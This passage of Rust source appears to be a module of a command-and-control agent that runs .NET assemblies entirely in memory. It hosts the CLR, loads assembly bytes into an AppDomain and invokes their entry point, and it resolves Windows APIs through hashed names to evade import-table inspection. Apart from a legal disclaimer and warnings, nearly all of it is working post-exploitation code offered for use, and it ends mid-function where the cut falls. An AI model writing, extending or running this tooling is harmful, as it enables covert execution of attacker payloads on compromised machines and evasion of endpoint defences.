#![allow(non_snake_case)]
#![allow(dead_code)]
// .NET Assembly Execution Module
//
// ⚠️ WARNING: This module implements in-memory .NET assembly execution techniques
// commonly used in advanced C2 frameworks and post-exploitation tools.
// 
// LEGAL NOTICE:
// - Only use for legitimate security research, authorized penetration testing,
//   or educational purposes with proper authorization.
// - Unauthorized use of these techniques may violate laws and regulations.
// - The authors are not responsible for any misuse of this code.
//
// TECHNICAL IMPLEMENTATION:
// - Hosts the .NET Common Language Runtime (CLR) within the agent process
// - Loads C# assemblies directly from memory without touching disk
// - Redirects stdout/stderr for output capture
// - Supports argument passing to Main method

use crate::types::CommandResult;
#[allow(unused_imports)]
use log::{debug, error, info, warn};

#[cfg(target_os = "windows")]
use std::ptr;

#[cfg(target_os = "windows")]
use winapi::{
    shared::winerror::FAILED,
    shared::guiddef::GUID,
    um::unknwnbase::{IUnknown, IUnknownVtbl},
};

#[cfg(target_os = "windows")]
const COINIT_APARTMENTTHREADED: u32 = 0x2;

#[cfg(target_os = "windows")]
unsafe fn dyn_co_initialize_ex(flags: u32) -> i32 {
    type Fn = unsafe extern "system" fn(*mut winapi::ctypes::c_void, u32) -> i32;
    for dll in [b"combase.dll".as_slice(), b"ole32.dll".as_slice()] {
        let base = crate::stealth::get_module_base(crate::stealth::hash_module_name(dll));
        if base == 0 {
            continue;
        }
        if let Some(addr) =
            crate::stealth::get_api_addr(base, crate::stealth::hash_api_name(b"CoInitializeEx"))
        {
            let f: Fn = std::mem::transmute(addr);
            return f(std::ptr::null_mut(), flags);
        }
    }
    -1
}

#[cfg(target_os = "windows")]
unsafe fn dyn_co_uninitialize() {
    type Fn = unsafe extern "system" fn();
    for dll in [b"combase.dll".as_slice(), b"ole32.dll".as_slice()] {
        let base = crate::stealth::get_module_base(crate::stealth::hash_module_name(dll));
        if base == 0 {
            continue;
        }
        if let Some(addr) =
            crate::stealth::get_api_addr(base, crate::stealth::hash_api_name(b"CoUninitialize"))
        {
            let f: Fn = std::mem::transmute(addr);
            f();
            return;
        }
    }
}

// --- CLR Hosting COM Interfaces ---
#[cfg(target_os = "windows")]
RIDL! {#[uuid(0x91119f96, 0xdcc4, 0x49a4, 0xa2, 0x60, 0x23, 0x61, 0x96, 0x73, 0x99, 0xc7)]
interface ICLRMetaHost(ICLRMetaHostVtbl): IUnknown(IUnknownVtbl) {
    fn GetRuntime(
        pwzVersion: *const u16,
        riid: *const GUID,
        ppRuntime: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn GetVersionFromFile(
        pwzFilePath: *const u16,
        pwzBuffer: *mut u16,
        pcchBuffer: *mut u32,
    ) -> i32,
    fn EnumerateInstalledRuntimes(
        ppEnumerator: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn EnumerateLoadedRuntimes(
        hProcess: *mut winapi::ctypes::c_void,
        ppEnumerator: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn RequestRuntimeLoadedNotification(
        pCallback: *mut winapi::ctypes::c_void,
    ) -> i32,
    fn QueryLegacyV2RuntimeBinding(
        riid: *const GUID,
        ppUnk: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn ExitProcess(
        iExitCode: i32,
    ) -> i32,
}}

#[cfg(target_os = "windows")]
RIDL! {#[uuid(0xbd39d1d2, 0xba2f, 0x486a, 0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91)]
interface ICLRRuntimeInfo(ICLRRuntimeInfoVtbl): IUnknown(IUnknownVtbl) {
    fn GetVersionString(
        pwzBuffer: *mut u16,
        pcchBuffer: *mut u32,
    ) -> i32,
    fn GetRuntimeDirectory(
        pwzBuffer: *mut u16,
        pcchBuffer: *mut u32,
    ) -> i32,
    fn IsLoaded(
        hProcess: *mut winapi::ctypes::c_void,
        pbLoaded: *mut i32,
    ) -> i32,
    fn LoadErrorString(
        iResourceID: u32,
        pwzBuffer: *mut u16,
        pcchBuffer: *mut u32,
        iLocaleID: u32,
    ) -> i32,
    fn LoadLibrary(
        pwzFilePath: *const u16,
        ppMod: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn GetProcAddress(
        pszProcName: *const i8,
        ppProc: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn GetInterface(
        rclsid: *const GUID,
        riid: *const GUID,
        ppUnk: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn IsStarted(
        pbStarted: *mut i32,
        pdwStartupFlags: *mut u32,
    ) -> i32,
    fn AppendDefaultAlias(
        pwzAppPath: *const u16,
    ) -> i32,
    fn IsDefaultAlias(
        pwzAppPath: *const u16,
        pbIsDefault: *mut i32,
    ) -> i32,
    fn FreeDefaultAlias(
        pwzAppPath: *const u16,
    ) -> i32,
}}

// CLSID_CorRuntimeHost / IID_ICorRuntimeHost (note: CLSID and IID differ by one digit)
#[cfg(target_os = "windows")]
const CLSID_COR_RUNTIME_HOST: GUID = GUID {
    Data1: 0xcb2f6723,
    Data2: 0xab3a,
    Data3: 0x11d2,
    Data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
};
#[cfg(target_os = "windows")]
const IID_ICOR_RUNTIME_HOST: GUID = GUID {
    Data1: 0xcb2f6722,
    Data2: 0xab3a,
    Data3: 0x11d2,
    Data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
};

#[cfg(target_os = "windows")]
RIDL! {#[uuid(0xcb2f6722, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e)]
interface ICorRuntimeHost(ICorRuntimeHostVtbl): IUnknown(IUnknownVtbl) {
    fn CreateLogicalThreadState() -> i32,
    fn DeleteLogicalThreadState() -> i32,
    fn SwitchInLogicalThreadState(
        pFiberCookie: *mut u32,
    ) -> i32,
    fn SwitchOutLogicalThreadState(
        pFiberCookie: *mut *mut u32,
    ) -> i32,
    fn LocksHeldByLogicalThread(
        pCount: *mut u32,
    ) -> i32,
    fn MapFile(
        hFile: *mut winapi::ctypes::c_void,
        hMapAddress: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn GetConfiguration(
        pConfiguration: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn Start() -> i32,
    fn Stop() -> i32,
    fn CreateDomain(
        pwzFriendlyName: *const u16,
        pIdentityArray: *mut winapi::ctypes::c_void,
        pAppDomain: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn GetDefaultDomain(
        pAppDomain: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn EnumDomains(
        hEnum: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn NextDomain(
        hEnum: *mut winapi::ctypes::c_void,
        pAppDomain: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn CloseEnum(
        hEnum: *mut winapi::ctypes::c_void,
    ) -> i32,
    fn CreateDomainEx(
        pwzFriendlyName: *const u16,
        pSetup: *mut winapi::ctypes::c_void,
        pEvidence: *mut winapi::ctypes::c_void,
        pAppDomain: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn CreateDomainSetup(
        pAppDomainSetup: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn CreateEvidence(
        pEvidence: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
    fn UnloadDomain(
        pAppDomain: *mut winapi::ctypes::c_void,
    ) -> i32,
    fn CurrentDomain(
        pAppDomain: *mut *mut winapi::ctypes::c_void,
    ) -> i32,
}}

// ─── Pure in-memory load helpers (IDispatch + SAFEARRAY, no temp files) ──────

#[cfg(target_os = "windows")]
const VT_EMPTY: u16 = 0;
#[cfg(target_os = "windows")]
const VT_NULL: u16 = 1;
#[cfg(target_os = "windows")]
const VT_BSTR: u16 = 8;
#[cfg(target_os = "windows")]
const VT_DISPATCH: u16 = 9;
#[cfg(target_os = "windows")]
const VT_ERROR: u16 = 10;
#[cfg(target_os = "windows")]
const VT_VARIANT: u16 = 12;
#[cfg(target_os = "windows")]
const VT_UNKNOWN: u16 = 13;
#[cfg(target_os = "windows")]
const VT_UI1: u16 = 17;
#[cfg(target_os = "windows")]
const VT_ARRAY: u16 = 0x2000;
#[cfg(target_os = "windows")]
const DISPATCH_METHOD: u16 = 0x1;
#[cfg(target_os = "windows")]
const DISPATCH_PROPERTYGET: u16 = 0x2;
#[cfg(target_os = "windows")]
const LOCALE_USER_DEFAULT: u32 = 0x0400;
#[cfg(target_os = "windows")]
const IID_NULL: GUID = GUID {
    Data1: 0,
    Data2: 0,
    Data3: 0,
    Data4: [0, 0, 0, 0, 0, 0, 0, 0],
};
#[cfg(target_os = "windows")]
const IID_IDISPATCH: GUID = GUID {
    Data1: 0x00020400,
    Data2: 0x0000,
    Data3: 0x0000,
    Data4: [0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

#[cfg(target_os = "windows")]
#[repr(C)]
struct SafeArrayBound {
    c_elements: u32,
    l_lbound: i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct Variant {
    vt: u16,
    w_reserved1: u16,
    w_reserved2: u16,
    w_reserved3: u16,
    // Windows VARIANT: 16 bytes (x86) / 24 bytes (x64). Header 8 + union 8 / 16.
    data: u64,
    #[cfg(target_arch = "x86_64")]
    data_hi: u64,
}

#[cfg(target_os = "windows")]
impl Variant {
    fn empty() -> Self {
        unsafe { std::mem::zeroed() }
    }

    fn set_parray(&mut self, vt: u16, psa: *mut c_void) {
        self.vt = vt;
        self.data = psa as u64;
        #[cfg(target_arch = "x86_64")]
        {
            self.data_hi = 0;
        }
    }

    fn set_pdisp(&mut self, p: *mut c_void) {
        self.vt = VT_DISPATCH;
        self.data = p as u64;
        #[cfg(target_arch = "x86_64")]
        {
            self.data_hi = 0;
        }
    }

    fn set_null(&mut self) {
        self.vt = VT_NULL;
        self.data = 0;
        #[cfg(target_arch = "x86_64")]
        {
            self.data_hi = 0;
        }
    }

    fn as_pdisp(&self) -> *mut c_void {
        if self.vt == VT_DISPATCH || self.vt == VT_UNKNOWN {
            self.data as usize as *mut c_void
        } else {
            ptr::null_mut()
        }
    }
}

#[cfg(target_os = "windows")]
use winapi::ctypes::c_void;

#[cfg(target_os = "windows")]
#[repr(C)]
struct DispParams {
    rgvarg: *mut Variant,
    rgdispid_named_args: *mut i32,
    c_args: u32,
    c_named_args: u32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct IDispatchVtbl {
    query_interface: unsafe extern "system" fn(
        this: *mut IDispatch,
        riid: *const GUID,
        ppv: *mut *mut c_void,
    ) -> i32,
    add_ref: unsafe extern "system" fn(this: *mut IDispatch) -> u32,
    release: unsafe extern "system" fn(this: *mut IDispatch) -> u32,
    get_type_info_count: unsafe extern "system" fn(this: *mut IDispatch, pctinfo: *mut u32) -> i32,
    get_type_info: unsafe extern "system" fn(
        this: *mut IDispatch,
        i_tinfo: u32,
        lcid: u32,
        pp_tinfo: *mut *mut c_void,
    ) -> i32,
    get_ids_of_names: unsafe extern "system" fn(
        this: *mut IDispatch,
        riid: *const GUID,
        rgsz_names: *mut *mut u16,
        c_names: u32,
        lcid: u32,
        rg_dispid: *mut i32,
    ) -> i32,
    invoke: unsafe extern "system" fn(
        this: *mut IDispatch,
        dispid_member: i32,
        riid: *const GUID,
        lcid: u32,
        w_flags: u16,
        p_disp_params: *mut DispParams,
        p_var_result: *mut Variant,
        p_excep_info: *mut c_void,
        pu_arg_err: *mut u32,
    ) -> i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct IDispatch {
    lp_vtbl: *const IDispatchVtbl,
}

#[cfg(target_os = "windows")]
struct OleAut {
    safe_array_create: unsafe extern "system" fn(u16, u32, *const SafeArrayBound) -> *mut c_void,
    safe_array_access_data: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32,
    safe_array_unaccess_data: unsafe extern "system" fn(*mut c_void) -> i32,
    safe_array_destroy: unsafe extern "system" fn(*mut c_void) -> i32,
    safe_array_put_element: unsafe extern "system" fn(*mut c_void, *const i32, *mut c_void) -> i32,
    sys_alloc_string: unsafe extern "system" fn(*const u16) -> *mut u16,
    sys_free_string: unsafe extern "system" fn(*mut u16),
    variant_clear: unsafe extern "system" fn(*mut Variant) -> i32,
}

#[cfg(target_os = "windows")]
unsafe fn resolve_oleaut() -> Option<OleAut> {
    let base = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"oleaut32.dll"));
    let base = if base == 0 {
        let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        let load: unsafe extern "system" fn(*const i8) -> usize = std::mem::transmute(
            crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"LoadLibraryA"))?,
        );
        load(b"oleaut32.dll\0".as_ptr() as *const i8)
    } else {
        base
    };
    if base == 0 {
        return None;
    }
    let g = |name: &[u8]| crate::stealth::get_api_addr(base, crate::stealth::hash_api_name(name));
    Some(OleAut {
        safe_array_create: std::mem::transmute(g(b"SafeArrayCreate")?),
        safe_array_access_data: std::mem::transmute(g(b"SafeArrayAccessData")?),
        safe_array_unaccess_data: std::mem::transmute(g(b"SafeArrayUnaccessData")?),
        safe_array_destroy: std::mem::transmute(g(b"SafeArrayDestroy")?),
        safe_array_put_element: std::mem::transmute(g(b"SafeArrayPutElement")?),
        sys_alloc_string: std::mem::transmute(g(b"SysAllocString")?),
        sys_free_string: std::mem::transmute(g(b"SysFreeString")?),
        variant_clear: std::mem::transmute(g(b"VariantClear")?),
    })
}

#[cfg(target_os = "windows")]
unsafe fn qi_idispatch(unk: *mut IUnknown) -> Result<*mut IDispatch, String> {
    if unk.is_null() {
        return Err("null IUnknown".into());
    }
    let mut disp: *mut IDispatch = ptr::null_mut();
    let hr = (*unk).QueryInterface(
        &IID_IDISPATCH,
        &mut disp as *mut _ as *mut *mut c_void,
    );
    if hr < 0 || disp.is_null() {
        return Err(format!("QueryInterface(IDispatch) failed: 0x{:08X}", hr as u32));
    }
    Ok(disp)
}

#[cfg(target_os = "windows")]
unsafe fn idispatch_get_id(disp: *mut IDispatch, name: &str) -> Result<i32, String> {
    let mut wide: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
    let mut name_ptr: *mut u16 = wide.as_mut_ptr();
    let mut dispid: i32 = 0;
    let hr = ((*(*disp).lp_vtbl).get_ids_of_names)(
        disp,
        &IID_NULL,
        &mut name_ptr,
        1,
        LOCALE_USER_DEFAULT,
        &mut dispid,
    );
    if hr < 0 {
        return Err(format!("GetIDsOfNames({name}) 0x{:08X}", hr as u32));
    }
    Ok(dispid)
}

#[cfg(target_os = "windows")]
unsafe fn idispatch_invoke(
    disp: *mut IDispatch,
    dispid: i32,
    flags: u16,
    args: &mut [Variant],
) -> Result<Variant, String> {
    // COM: arguments are in reverse order in DISPPARAMS
    let mut rev: Vec<Variant> = args.iter().rev().cloned().collect();
    let mut params = DispParams {
        rgvarg: if rev.is_empty() {
            ptr::null_mut()
        } else {
            rev.as_mut_ptr()
        },
        rgdispid_named_args: ptr::null_mut(),
        c_args: rev.len() as u32,
        c_named_args: 0,
    };
    let mut result = Variant::empty();
    let mut arg_err: u32 = 0;
    let hr = ((*(*disp).lp_vtbl).invoke)(
        disp,
        dispid,
        &IID_NULL,
        LOCALE_USER_DEFAULT,
        flags,
        &mut params,
        &mut result,
        ptr::null_mut(),
        &mut arg_err,
    );
    if hr < 0 {
        return Err(format!("IDispatch::Invoke 0x{:08X} (arg_err={})", hr as u32, arg_err));
    }
    Ok(result)
}

// Variant must be Clone for rev collect - implement manually
#[cfg(target_os = "windows")]
impl Clone for Variant {
    fn clone(&self) -> Self {
        Self {
            vt: self.vt,
            w_reserved1: self.w_reserved1,
            w_reserved2: self.w_reserved2,
            w_reserved3: self.w_reserved3,
            data: self.data,
            #[cfg(target_arch = "x86_64")]
            data_hi: self.data_hi,
        }
    }
}

#[cfg(target_os = "windows")]
unsafe fn make_byte_safearray(ole: &OleAut, bytes: &[u8]) -> Result<*mut c_void, String> {
    let bound = SafeArrayBound {
        c_elements: bytes.len() as u32,
        l_lbound: 0,
    };
    let psa = (ole.safe_array_create)(VT_UI1, 1, &bound);
    if psa.is_null() {
        return Err("SafeArrayCreate(VT_UI1) failed".into());
    }
    let mut pdata: *mut c_void = ptr::null_mut();
    let hr = (ole.safe_array_access_data)(psa, &mut pdata);
    if hr < 0 || pdata.is_null() {
        let _ = (ole.safe_array_destroy)(psa);
        return Err(format!("SafeArrayAccessData 0x{:08X}", hr as u32));
    }
    std::ptr::copy_nonoverlapping(bytes.as_ptr(), pdata as *mut u8, bytes.len());
    let _ = (ole.safe_array_unaccess_data)(psa);
    Ok(psa)
}

#[cfg(target_os = "windows")]
unsafe fn make_string_array(ole: &OleAut, args: &[String]) -> Result<*mut c_void, String> {
    let bound = SafeArrayBound {
        c_elements: args.len() as u32,
        l_lbound: 0,
    };
    let psa = (ole.safe_array_create)(VT_BSTR, 1, &bound);
    if psa.is_null() {
        return Err("SafeArrayCreate(VT_BSTR) failed".into());
    }
    for (i, s) in args.iter().enumerate() {
        let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0)).collect();
        let bstr = (ole.sys_alloc_string)(wide.as_ptr());
        let idx: i32 = i as i32;
        // PutElement copies the BSTR for VT_BSTR arrays
        let hr = (ole.safe_array_put_element)(psa, &idx, &bstr as *const _ as *mut c_void);
        (ole.sys_free_string)(bstr);
        if hr < 0 {
            let _ = (ole.safe_array_destroy)(psa);
            return Err(format!("SafeArrayPutElement[{i}] 0x{:08X}", hr as u32));
        }
    }
    Ok(psa)
}

/// .NET Assembly Executor
pub struct DotNetExecutor;

impl DotNetExecutor {
    /// Execute a .NET assembly from memory
    /// 
    /// ⚠️ SECURITY WARNING: This function implements in-memory .NET assembly execution,
    /// a technique commonly used by advanced malware and C2 frameworks for evasion.
    /// 
    /// # Parameters
    /// 
    /// * `assembly_bytes` - Raw .NET assembly (PE/EXE) bytes
    /// * `arguments` - Command line arguments to pass to Main method
    /// * `app_domain_name` - Optional custom AppDomain name for stealth
    /// 
    /// # Returns
    /// 
    /// CommandResult with execution output and status
    /// 
    /// # Implementation Details
    /// 
    /// 1. Initializes COM and hosts the .NET CLR
    /// 2. Creates a custom AppDomain for isolation
    /// 3. Loads assembly from byte array into memory
    /// 4. Redirects stdout/stderr for output capture
    /// 5. Invokes Main method with provided arguments
    /// 6. Captures and returns execution results
    /// 7. Cleans up CLR resources
    #[cfg(target_os = "windows")]
    pub async fn execute_assembly(
        assembly_bytes: Vec<u8>,
        arguments: Vec<String>,
        app_domain_name: Option<&str>,
    ) -> CommandResult {
        log::info!("🚨 .NET ASSEMBLY EXECUTION: Loading assembly from memory");
        log::warn!("⚠️  Advanced C2 technique - ensure you have proper authorization!");
        
        if assembly_bytes.is_empty() {
            return CommandResult {
                stdout: String::new(),
                stderr: ".NET assembly data is empty".to_string(),
                path: None,
                req_id: None,
            };
        }
        
        // Validate PE/MZ header
        if assembly_bytes.len() < 2 || &assembly_bytes[0..2] != b"MZ" {
            return CommandResult {
                stdout: String::new(),
                stderr: "Invalid .NET assembly: missing PE/MZ header".to_string(),
                path: None,
                req_id: None,
            };
        }
        
        log::debug!(".NET assembly size: {} bytes", assembly_bytes.len());
        log::debug!("Arguments: {:?}", arguments);
        
        // Step 1: Initialize COM
        let com_result = unsafe { dyn_co_initialize_ex(COINIT_APARTMENTTHREADED) };
        if FAILED(com_result) && com_result != -2147417850i32 { // RPC_E_CHANGED_MODE is OK
            log::error!("Failed to initialize COM: 0x{:08X}", com_result);
            return CommandResult {
                stdout: String::new(),
                stderr: format!("COM initialization failed: 0x{:08X}", com_result),
                path: None,
                req_id: None,
            };
        }
        
        log::debug!("COM initialized successfully");
        
        // Step 2: Create CLR Host
        let result = Self::create_clr_host_and_execute(
            assembly_bytes,
            arguments,
            app_domain_name.unwrap_or("DefaultDomain"),
        ).await;
        
        // Step 3: Cleanup COM
        unsafe { dyn_co_uninitialize() };
        
        result
    }
    
    /// Create CLR host and execute assembly **purely in memory** (no temp file).
    ///
    /// Flow: ICLRMetaHost → ICorRuntimeHost → AppDomain → Load_3(byte[]) → EntryPoint.Invoke
    #[cfg(target_os = "windows")]
    async fn create_clr_host_and_execute(
        assembly_bytes: Vec<u8>,
        arguments: Vec<String>,
        domain_name: &str,
    ) -> CommandResult {
        use winapi::shared::winerror::S_OK;
        use winapi::Interface;
        use winapi::um::unknwnbase::IUnknown;
        use widestring::WideCString;

        unsafe {
            let ole = match resolve_oleaut() {
                Some(o) => o,
                None => {
                    return CommandResult {
                        stdout: String::new(),
                        stderr: "Failed to resolve oleaut32 (SAFEARRAY APIs)".into(),
                        path: None,
                        req_id: None,
                    };
                }
            };

            // 1. Ensure mscoree.dll is loaded via PEB/hash (avoid IAT LoadLibraryA).
            let mut mscoree = crate::stealth::get_module_base(
                crate::stealth::hash_module_name(b"mscoree.dll"),
            );
            if mscoree == 0 {
                let k32 = crate::stealth::get_module_base(
                    crate::stealth::hash_module_name(b"kernel32.dll"),
                );
                if let Some(load_addr) =
                    crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"LoadLibraryA"))
                {
                    let load_library: unsafe extern "system" fn(*const i8) -> usize =
                        std::mem::transmute(load_addr);
                    mscoree = load_library(b"mscoree.dll\0".as_ptr() as *const i8);
                }
            }
            if mscoree == 0 {
                return CommandResult {
                    stdout: String::new(),
                    stderr: "Failed to resolve mscoree.dll".into(),
                    path: None,
                    req_id: None,
                };
            }

            let clsid_meta: GUID = GUID {
                Data1: 0x91119f96,
                Data2: 0xdcc4,
                Data3: 0x49a4,
                Data4: [0xa2, 0x60, 0x23, 0x61, 0x96, 0x73, 0x99, 0xc7],
            };
            let iid_meta = ICLRMetaHost::uuidof();

            type CoCreateInstanceFn = unsafe extern "system" fn(
                *const GUID,
                *mut c_void,
                u32,
                *const GUID,
                *mut *mut c_void,
            ) -> i32;

            let mut co_create: Option<CoCreateInstanceFn> = None;
            for dll in [b"combase.dll".as_slice(), b"ole32.dll".as_slice()] {
                let base = crate::stealth::get_module_base(crate::stealth::hash_module_name(dll));
                if base == 0 {
                    continue;
                }
                if let Some(addr) = crate::stealth::get_api_addr(
                    base,
                    crate::stealth::hash_api_name(b"CoCreateInstance"),
                ) {
                    co_create = Some(std::mem::transmute(addr));
                    break;
                }
            }
            let co_create = match co_create {
                Some(f) => f,
                None => {
                    return CommandResult {
                        stdout: String::new(),
                        stderr: "Failed to resolve CoCreateInstance".into(),
                        path: None,
                        req_id: None,
                    };
                }
            };

            let mut meta_host: *mut ICLRMetaHost = ptr::null_mut();
            let hr = co_create(
                &clsid_meta,
                ptr::null_mut(),
                0x17,
                &iid_meta,
                &mut meta_host as *mut _ as *mut *mut c_void,
            );
            if hr != S_OK || meta_host.is_null() {
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to create ICLRMetaHost: 0x{:08X}", hr),
                    path: None,
                    req_id: None,
                };
            }

            let mut runtime_info: *mut ICLRRuntimeInfo = ptr::null_mut();
            let version = WideCString::from_str("v4.0.30319").unwrap();
            let hr = (*meta_host).GetRuntime(
                version.as_ptr(),
                &ICLRRuntimeInfo::uuidof(),
                &mut runtime_info as *mut _ as *mut *mut _,
            );
            if hr != S_OK || runtime_info.is_null() {
                (*meta_host).Release();
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to get ICLRRuntimeInfo: 0x{:08X}", hr),
                    path: None,
                    req_id: None,
                };
            }

            let mut runtime_host: *mut ICorRuntimeHost = ptr::null_mut();
            let hr = (*runtime_info).GetInterface(
                &CLSID_COR_RUNTIME_HOST,
                &IID_ICOR_RUNTIME_HOST,
                &mut runtime_host as *mut _ as *mut *mut _,
            );
            if hr != S_OK || runtime_host.is_null() {
                (*runtime_info).Release();
                (*meta_host).Release();
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to get ICorRuntimeHost: 0x{:08X}", hr),
                    path: None,
                    req_id: None,
                };
            }

            let hr = (*runtime_host).Start();
            if hr < 0 {
                (*runtime_host).Release();
                (*runtime_info).Release();
                (*meta_host).Release();
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("ICorRuntimeHost::Start failed: 0x{:08X}", hr as u32),
                    path: None,
                    req_id: None,
                };
            }

            let mut app_domain_unk: *mut IUnknown = ptr::null_mut();
            let domain_name_w = WideCString::from_str(domain_name).unwrap();
            let hr = (*runtime_host).CreateDomain(
                domain_name_w.as_ptr(),
                ptr::null_mut(),
                &mut app_domain_unk as *mut _ as *mut *mut _,
            );
            if hr != S_OK || app_domain_unk.is_null() {
                (*runtime_host).Release();
                (*runtime_info).Release();
                (*meta_host).Release();
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to create AppDomain: 0x{:08X}", hr),
                    path: None,
                    req_id: None,
                };
            }

            // Pure memory path: AppDomain.Load_3(byte[]) via IDispatch — no disk write.
            let result = (|| -> Result<String, String> {
                let domain = qi_idispatch(app_domain_unk)?;

                let psa_bytes = make_byte_safearray(&ole, &assembly_bytes)?;
                let mut load_arg = Variant::empty();
                load_arg.set_parray(VT_ARRAY | VT_UI1, psa_bytes);

                let load_id = idispatch_get_id(domain, "Load_3")
                    .or_else(|_| idispatch_get_id(domain, "Load"))?;
                let mut load_args = [load_arg];
                let asm_var = match idispatch_invoke(domain, load_id, DISPATCH_METHOD, &mut load_args)
                {
                    Ok(v) => v,
                    Err(e) => {
                        let _ = (ole.safe_array_destroy)(psa_bytes);
                        return Err(e);
                    }
                };
                // Load_3 takes ownership of the SAFEARRAY content via COM marshal; destroy our ref.
                let _ = (ole.safe_array_destroy)(psa_bytes);

                let asm_disp = asm_var.as_pdisp() as *mut IDispatch;
                if asm_disp.is_null() {
                    let _ = (ole.variant_clear)(&asm_var as *const _ as *mut Variant);
                    return Err("AppDomain.Load returned null Assembly".into());
                }

                // Assembly.EntryPoint (property get)
                let ep_id = idispatch_get_id(asm_disp, "EntryPoint")?;
                let ep_var =
                    idispatch_invoke(asm_disp, ep_id, DISPATCH_PROPERTYGET, &mut [])?;
                let method_disp = ep_var.as_pdisp() as *mut IDispatch;
                if method_disp.is_null() {
                    ((*(*asm_disp).lp_vtbl).release)(asm_disp);
                    return Err("Assembly.EntryPoint is null (library without Main?)".into());
                }

                // Build object[] { string[] args } for MethodInfo.Invoke(null, parameters)
                let psa_strings = make_string_array(&ole, &arguments)?;
                let mut str_arr_var = Variant::empty();
                str_arr_var.set_parray(VT_ARRAY | VT_BSTR, psa_strings);

                let bound = SafeArrayBound {
                    c_elements: 1,
                    l_lbound: 0,
                };
                let psa_params = (ole.safe_array_create)(VT_VARIANT, 1, &bound);
                if psa_params.is_null() {
                    let _ = (ole.safe_array_destroy)(psa_strings);
                    ((*(*method_disp).lp_vtbl).release)(method_disp);
                    ((*(*asm_disp).lp_vtbl).release)(asm_disp);
                    return Err("SafeArrayCreate(VT_VARIANT) failed".into());
                }
                let idx0: i32 = 0;
                let hr = (ole.safe_array_put_element)(
                    psa_params,
                    &idx0,
                    &mut str_arr_var as *mut _ as *mut c_void,
                );
                if hr < 0 {
                    let _ = (ole.safe_array_destroy)(psa_params);
                    let _ = (ole.safe_array_destroy)(psa_strings);
                    ((*(*method_disp).lp_vtbl).release)(method_disp);
                    ((*(*asm_disp).lp_vtbl).release)(asm_disp);
                    return Err(format!("SafeArrayPutElement params 0x{:08X}", hr as u32));
                }

                let mut obj_arg = Variant::empty();
                obj_arg.set_null();
                let mut params_arg = Variant::empty();
                params_arg.set_parray(VT_ARRAY | VT_VARIANT, psa_params);

                // MethodInfo.Invoke(object obj, object[] parameters) — try Invoke then Invoke_3
                let invoke_id = idispatch_get_id(method_disp, "Invoke")
                    .or_else(|_| idispatch_get_id(method_disp, "Invoke_3"))?;
                let mut invoke_args = [obj_arg, params_arg];
                let invoke_result =
                    idispatch_invoke(method_disp, invoke_id, DISPATCH_METHOD, &mut invoke_args);

                let _ = (ole.safe_array_destroy)(psa_params);
                // str_arr_var ownership transferred into params array; destroy carefully
                let _ = (ole.variant_clear)(&mut str_arr_var);
                ((*(*method_disp).lp_vtbl).release)(method_disp);
                ((*(*asm_disp).lp_vtbl).release)(asm_disp);
                ((*(*domain).lp_vtbl).release)(domain);

                match invoke_result {
                    Ok(mut v) => {
                        let summary = format!(
                            ".NET Assembly executed in-memory (no disk). VARIANT vt=0x{:X}",
                            v.vt
                        );
                        let _ = (ole.variant_clear)(&mut v);
                        Ok(summary)
                    }
                    Err(e) => Err(e),
                }
            })();

            // Unload domain if possible, then release hosts
            let _ = (*runtime_host).UnloadDomain(app_domain_unk as *mut _);
            (*app_domain_unk).Release();
            (*runtime_host).Release();
            (*runtime_info).Release();
            (*meta_host).Release();

            match result {
                Ok(stdout) => CommandResult {
                    stdout,
                    stderr: String::new(),
                    path: None,
                    req_id: None,
                },
                Err(e) => CommandResult {
                    stdout: String::new(),
                    stderr: format!("In-memory .NET execution failed: {e}"),
                    path: None,
                    req_id: None,
                },
            }
        }
    }
    
    /// Execute .NET assembly using dotnet runtime
    #[cfg(target_os = "windows")]
    async fn execute_dotnet_assembly(path: &str, arguments: &[String]) -> CommandResult {
        log::info!("🚀 Executing .NET assembly: {}", path);
        
        // Try different .NET execution methods
        let mut result = Self::try_dotnet_execution(path, arguments).await;
        
        // If dotnet execution fails entirely OR returns a non-zero exit code (e.g., missing runtime config),
        // fallback to direct execution (.NET Framework).
        if let Ok(ref output) = result {
            if !output.status.success() {
                debug!("dotnet execution failed with exit code {:?}, falling back to direct execution", output.status.code());
                let fallback = Self::try_framework_execution(path, arguments).await;
                if fallback.is_ok() {
                    result = fallback;
                }
            }
        } else {
             result = Self::try_framework_execution(path, arguments).await;
        }
        
        match result {
